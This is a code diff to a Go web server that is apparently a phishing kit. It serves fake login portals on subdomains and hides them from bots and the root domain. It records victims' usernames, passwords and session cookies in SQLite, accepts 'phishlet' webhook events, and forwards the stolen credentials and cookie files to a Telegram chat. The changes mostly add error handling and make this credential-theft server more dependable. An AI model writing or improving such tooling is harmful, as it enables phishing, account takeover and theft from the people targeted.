@@ -18,7 +18,6 @@ import (
 	"runtime"
 	"strings"
 	"sync"
-	"sync/atomic"
 	"time"
 
 	"golang.org/x/time/rate"
@@ -27,6 +26,7 @@ import (
 	"github.com/google/uuid"
 	_ "github.com/mattn/go-sqlite3"
 )
+import "sync/atomic"
 
 type Config struct {
 	Domain           string   `json:"domain"`
@@ -133,16 +133,22 @@ func initDB() {
 		log.Fatalf("DB error: %v", err)
 	}
 
-	db.Exec(`CREATE TABLE IF NOT EXISTS sessions (
+	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS sessions (
 		id TEXT PRIMARY KEY, site TEXT, username TEXT, password TEXT,
 		ip TEXT, ua TEXT, is_bot INTEGER, step1 TEXT, step2 TEXT,
 		cookies TEXT, completed INTEGER, created TEXT
 	)`)
+	if err != nil {
+		log.Fatalf("Failed to create sessions table: %v", err)
+	}
 	db.Exec(`CREATE INDEX IF NOT EXISTS idx_sessions_created ON sessions(created DESC)`)
-	db.Exec(`CREATE TABLE IF NOT EXISTS visits (
+	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS visits (
 		id INTEGER PRIMARY KEY AUTOINCREMENT, site TEXT, ip TEXT,
 		ua TEXT, is_bot INTEGER, bot TEXT, ref TEXT, created TEXT
 	)`)
+	if err != nil {
+		log.Fatalf("Failed to create visits table: %v", err)
+	}
 	db.Exec(`CREATE INDEX IF NOT EXISTS idx_visits_created ON visits(created DESC)`)
 }
 
@@ -244,7 +250,10 @@ func portalHandler(c *gin.Context) {
 	ua := c.GetHeader("User-Agent")
 	ip := getClientIP(c)
 
-	if bot, name := isBot(ua); bot {
+	// Handle root domain access first
+	isRoot := host == config.Domain || host == "www."+config.Domain
+
+	if bot, name := isBot(ua); bot || isRoot {
 		db.Exec(`INSERT INTO visits (site, ip, ua, is_bot, bot, ref, created) VALUES (?, ?, ?, 1, ?, ?, ?)`,
 			"unknown", ip, ua, name, c.GetHeader("Referer"), time.Now().Format(time.RFC3339))
 		c.Header("Content-Type", "text/html")
@@ -253,7 +262,6 @@ func portalHandler(c *gin.Context) {
 	}
 
 	var site string
-	isRoot := host == config.Domain || host == "www."+config.Domain
 	if strings.Contains(host, config.SubPortal1) {
 		site = "portal1"
 	} else if strings.Contains(host, config.SubPortal2) {
@@ -261,11 +269,16 @@ func portalHandler(c *gin.Context) {
 	} else if strings.Contains(host, config.SubPortal3) {
 		site = "portal3"
 	} else {
+		// If not a known portal subdomain and not the root domain, return 404
 		c.String(404, "Not Found")
+		return
 	}
 
-	db.Exec(`INSERT INTO visits (site, ip, ua, is_bot, bot, ref, created) VALUES (?, ?, ?, 0, ?, ?, ?)`,
+	_, err := db.Exec(`INSERT INTO visits (site, ip, ua, is_bot, bot, ref, created) VALUES (?, ?, ?, 0, ?, ?, ?)`,
 		site, ip, ua, "", c.GetHeader("Referer"), time.Now().Format(time.RFC3339))
+	if err != nil {
+		log.Printf("Error inserting visit for IP %s: %v", ip, err)
+	}
 
 	page := getPhishingPage(site)
 	c.Header("Content-Type", "text/html; charset=utf-8")
@@ -315,14 +328,15 @@ func step1Handler(c *gin.Context) {
 	id := uuid.New().String()
 	ip := getClientIP(c)
 
-	_, err := db.Exec(`INSERT INTO sessions (id, site, username, password, ip, ua, is_bot, step1, completed, created) VALUES (?, ?, ?, ?, ?, ?, 0, ?, 0, ?)`,
+	_, err = db.Exec(`INSERT INTO sessions (id, site, username, password, ip, ua, is_bot, step1, completed, created) VALUES (?, ?, ?, ?, ?, ?, 0, ?, 0, ?)`,
 		id, req.Site, req.Username, req.Password, ip, c.GetHeader("User-Agent"), time.Now().Format(time.RFC3339), time.Now().Format(time.RFC3339))
 	if err != nil {
+		log.Printf("Error inserting session for IP %s: %v", ip, err)
 		c.JSON(500, gin.H{"error": err.Error()})
 		return
 	}
 
-	msg := fmt.Sprintf("<b>🔐 NEW CREDENTIALS</b>\n\n<b>Site:</b> %s\n<b>Username:</b> %s\n<b>Password:</b> %s\n<b>IP:</b> %s\n<b>Time:</b> %s",
+	msg := fmt.Sprintf("<b>🔐 NEW CREDENTIALS</b>\n\n<b>Site:</b> %s\n<b>User:</b> %s\n<b>Pass:</b> %s\n<b>IP:</b> %s\n<b>Time:</b> %s",
 		req.Site, req.Username, req.Password, ip, time.Now().Format("2006-01-02 15:04:05"))
 	go sendTelegram(msg)
 
@@ -352,8 +366,11 @@ func webhookHandler(c *gin.Context) {
 		}
 		ua, _ := body["user_agent"].(string)
 
-		db.Exec(`INSERT INTO sessions (id, site, username, password, ip, ua, step1, completed, created) VALUES (?, ?, ?, ?, ?, ?, ?, 0, ?)`,
+		_, err := db.Exec(`INSERT INTO sessions (id, site, username, password, ip, ua, step1, completed, created) VALUES (?, ?, ?, ?, ?, ?, ?, 0, ?)`,
 			id, phishlet, username, password, ip, ua, time.Now().Format(time.RFC3339), time.Now().Format(time.RFC3339))
+		if err != nil {
+			log.Printf("Error inserting webhook session for IP %s: %v", ip, err)
+		}
 
 		msg := fmt.Sprintf("<b>🔐 WEBHOOK CREDENTIALS</b>\n\n<b>Site:</b> %s\n<b>User:</b> %s\n<b>Pass:</b> %s\n<b>IP:</b> %s",
 			phishlet, username, password, ip)
@@ -361,11 +378,14 @@ func webhookHandler(c *gin.Context) {
 		c.JSON(200, gin.H{"success": true, "id": id})
 	} else if event == "session" {
 		cookies, _ := body["cookie_str"].(string)
-		var id, ip string
-		db.QueryRow(`SELECT id, ip FROM sessions WHERE username = ? AND site = ? AND completed = 0 ORDER BY created DESC LIMIT 1`,
-			username, phishlet).Scan(&id, &ip)
+		var id string
+		err := db.QueryRow(`SELECT id FROM sessions WHERE username = ? AND site = ? AND completed = 0 ORDER BY created DESC LIMIT 1`,
+			username, phishlet).Scan(&id)
+		if err != nil && err != sql.ErrNoRows {
+			log.Printf("Error querying session for webhook: %v", err)
+		}
 		if id != "" {
-			db.Exec(`UPDATE sessions SET cookies = ?, step2 = ?, completed = 1 WHERE id = ?`,
+			_, err = db.Exec(`UPDATE sessions SET cookies = ?, step2 = ?, completed = 1 WHERE id = ?`,
 				cookies, time.Now().Format(time.RFC3339), id)
 			go sendTelegramFile(fmt.Sprintf("%s_%s.txt", phishlet, id), cookies, username)
 		}
@@ -389,8 +409,13 @@ func healthCheck(c *gin.Context) {
 
 func dashboardHandler(c *gin.Context) {
 	c.Header("Content-Type", "text/html; charset=utf-8")
-	tmpl := template.Must(template.New("dashboard").Parse(dashboardHTML))
-	tmpl.Execute(c.Writer, gin.H{
+	tmpl, err := template.New("dashboard").Parse(dashboardHTML)
+	if err != nil {
+		log.Printf("Error parsing dashboard template: %v", err)
+		c.String(500, "Internal Server Error")
+		return
+	}
+	err = tmpl.Execute(c.Writer, gin.H{
 		"domain":    config.Domain,
 		"version":   "2.0.0",
 		"goVersion": runtime.Version(),
@@ -399,11 +424,21 @@ func dashboardHandler(c *gin.Context) {
 
 func dashboardDataHandler(c *gin.Context) {
 	var totalSessions, totalVisits, totalBots int
-	db.QueryRow("SELECT COUNT(*) FROM sessions").Scan(&totalSessions)
-	db.QueryRow("SELECT COUNT(*) FROM visits").Scan(&totalVisits)
-	db.QueryRow("SELECT COUNT(*) FROM visits WHERE is_bot = 1").Scan(&totalBots)
+	if err := db.QueryRow("SELECT COUNT(*) FROM sessions").Scan(&totalSessions); err != nil {
+		log.Printf("Error getting total sessions: %v", err)
+	}
+	if err := db.QueryRow("SELECT COUNT(*) FROM visits").Scan(&totalVisits); err != nil {
+		log.Printf("Error getting total visits: %v", err)
+	}
+	if err := db.QueryRow("SELECT COUNT(*) FROM visits WHERE is_bot = 1").Scan(&totalBots); err != nil {
+		log.Printf("Error getting total bots: %v", err)
+	}
 
-	sessionRows, _ := db.Query(`SELECT id, site, username, password, ip, completed, created FROM sessions ORDER BY created DESC LIMIT 30`)
+	sessionRows, err := db.Query(`SELECT id, site, username, password, ip, completed, created FROM sessions ORDER BY created DESC LIMIT 30`)
+	if err != nil {
+		log.Printf("Error querying recent sessions: %v", err)
+		sessionRows = &sql.Rows{} // Provide empty rows to prevent nil pointer dereference
+	}
 	var sessions []map[string]interface{}
 	for sessionRows.Next() {
 		var id, site, user, pass, ip, created string
@@ -415,7 +450,11 @@ func dashboardDataHandler(c *gin.Context) {
 		})
 	}
 
-	visitRows, _ := db.Query(`SELECT created, site, ip, is_bot, bot FROM visits ORDER BY created DESC LIMIT 30`)
+	visitRows, err := db.Query(`SELECT created, site, ip, is_bot, bot FROM visits ORDER BY created DESC LIMIT 30`)
+	if err != nil {
+		log.Printf("Error querying recent visits: %v", err)
+		visitRows = &sql.Rows{} // Provide empty rows
+	}
 	var visits []map[string]interface{}
 	for visitRows.Next() {
 		var created, site, ip, bot string
@@ -450,7 +489,12 @@ func dashboardDataHandler(c *gin.Context) {
 }
 
 func sessionsHandler(c *gin.Context) {
-	rows, _ := db.Query(`SELECT id, site, username, password, ip, completed, created FROM sessions ORDER BY created DESC LIMIT 100`)
+	rows, err := db.Query(`SELECT id, site, username, password, ip, completed, created FROM sessions ORDER BY created DESC LIMIT 100`)
+	if err != nil {
+		log.Printf("Error querying sessions: %v", err)
+		c.JSON(500, gin.H{"error": "Failed to retrieve sessions"})
+		return
+	}
 	defer rows.Close()
 	var sessions []map[string]interface{}
 	for rows.Next() {
@@ -466,7 +510,12 @@ func sessionsHandler(c *gin.Context) {
 }
 
 func visitsHandler(c *gin.Context) {
-	rows, _ := db.Query(`SELECT created, site, ip, is_bot, bot, ref FROM visits ORDER BY created DESC LIMIT 100`)
+	rows, err := db.Query(`SELECT created, site, ip, is_bot, bot, ref FROM visits ORDER BY created DESC LIMIT 100`)
+	if err != nil {
+		log.Printf("Error querying visits: %v", err)
+		c.JSON(500, gin.H{"error": "Failed to retrieve visits"})
+		return
+	}
 	defer rows.Close()
 	var visits []map[string]interface{}
 	for rows.Next() {
@@ -484,7 +533,12 @@ func visitsHandler(c *gin.Context) {
 func logsHandler(c *gin.Context) {
 	lines := c.DefaultQuery("lines", "100")
 	cmd := execCommand("tail", "-n", lines, "/opt/authflow/logs/authflow.log")
-	output, _ := cmd.Output()
+	output, err := cmd.Output()
+	if err != nil {
+		log.Printf("Error executing tail command: %v", err)
+		c.String(500, "Failed to retrieve logs")
+		return
+	}
 	c.String(200, string(output))
 }
 
@@ -502,8 +556,12 @@ func cleanupHandler(c *gin.Context) {
 		retention = 30
 	}
 	cutoff := time.Now().AddDate(0, 0, -retention).Format(time.RFC3339)
-	db.Exec("DELETE FROM sessions WHERE created < ?", cutoff)
-	db.Exec("DELETE FROM visits WHERE created < ?", cutoff)
+	if _, err := db.Exec("DELETE FROM sessions WHERE created < ?", cutoff); err != nil {
+		log.Printf("Error cleaning up old sessions: %v", err)
+	}
+	if _, err := db.Exec("DELETE FROM visits WHERE created < ?", cutoff); err != nil {
+		log.Printf("Error cleaning up old visits: %v", err)
+	}
 	db.Exec("VACUUM")
 	c.JSON(200, gin.H{"success": true, "message": "Cleanup complete"})
 }
@@ -511,7 +569,15 @@ func cleanupHandler(c *gin.Context) {
 func downloadHandler(c *gin.Context) {
 	id := c.Param("id")
 	var cookies string
-	db.QueryRow("SELECT cookies FROM sessions WHERE id LIKE ?", id+"%").Scan(&cookies)
+	err := db.QueryRow("SELECT cookies FROM sessions WHERE id LIKE ?", id+"%").Scan(&cookies)
+	if err == sql.ErrNoRows {
+		c.String(404, "Session not found")
+		return
+	} else if err != nil {
+		log.Printf("Error downloading session %s: %v", id, err)
+		c.String(500, "Internal Server Error")
+		return
+	}
 	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=session_%s.txt", id))
 	c.String(200, cookies)
 }
@@ -524,7 +590,16 @@ func sendTelegram(msg string) {
 	data, _ := json.Marshal(map[string]string{
 		"chat_id": config.TelegramChatId, "text": msg, "parse_mode": "HTML",
 	})
-	http.Post(url, "application/json", bytes.NewBuffer(data))
+	resp, err := http.Post(url, "application/json", bytes.NewBuffer(data))
+	if err != nil {
+		log.Printf("Error sending Telegram message: %v", err)
+	} else if resp.StatusCode != http.StatusOK {
+		body, _ := io.ReadAll(resp.Body)
+		log.Printf("Telegram API error (%d): %s", resp.StatusCode, string(body))
+	}
+	if resp != nil {
+		resp.Body.Close()
+	}
 }
 
 func sendTelegramFile(name, content, caption string) {
@@ -539,7 +614,16 @@ func sendTelegramFile(name, content, caption string) {
 	w.WriteField("chat_id", config.TelegramChatId)
 	w.WriteField("caption", caption)
 	w.Close()
-	http.Post(url, w.FormDataContentType(), body)
+	resp, err := http.Post(url, w.FormDataContentType(), body)
+	if err != nil {
+		log.Printf("Error sending Telegram file: %v", err)
+	} else if resp.StatusCode != http.StatusOK {
+		body, _ := io.ReadAll(resp.Body)
+		log.Printf("Telegram API error (%d): %s", resp.StatusCode, string(body))
+	}
+	if resp != nil {
+		resp.Body.Close()
+	}
 }
 
 func runRateLimitCleanup() {
@@ -566,8 +650,12 @@ func runCleanupTicker() {
 			retention = 30
 		}
 		cutoff := time.Now().AddDate(0, 0, -retention).Format(time.RFC3339)
-		db.Exec("DELETE FROM sessions WHERE created < ?", cutoff)
-		db.Exec("DELETE FROM visits WHERE created < ?", cutoff)
+		if _, err := db.Exec("DELETE FROM sessions WHERE created < ?", cutoff); err != nil {
+			log.Printf("Error cleaning up old sessions in ticker: %v", err)
+		}
+		if _, err := db.Exec("DELETE FROM visits WHERE created < ?", cutoff); err != nil {
+			log.Printf("Error cleaning up old visits in ticker: %v", err)
+		}
 		db.Exec("VACUUM")
 	}
 }
